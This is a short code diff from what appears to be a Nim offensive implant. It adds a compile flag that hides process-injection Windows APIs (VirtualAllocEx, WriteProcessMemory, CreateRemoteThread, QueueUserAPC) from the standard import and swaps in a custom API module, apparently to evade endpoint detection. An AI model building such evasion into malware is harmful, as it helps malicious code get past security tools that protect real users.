@@ -6,7 +6,11 @@ import ../utils/strenc
 import std/[json, strutils, strformat, base64]
 
 when defined(windows):
-  import winim/lean
+  when defined(evasion_dfr):
+    import winim/lean except VirtualAllocEx, VirtualProtectEx, WriteProcessMemory, CreateRemoteThread, OpenProcess, CreateProcessA, ResumeThread, QueueUserAPC
+    import ../utils/winapi
+  else:
+    import winim/lean
   
   const
     PROCESS_CREATE_PROCESS = 0x0080
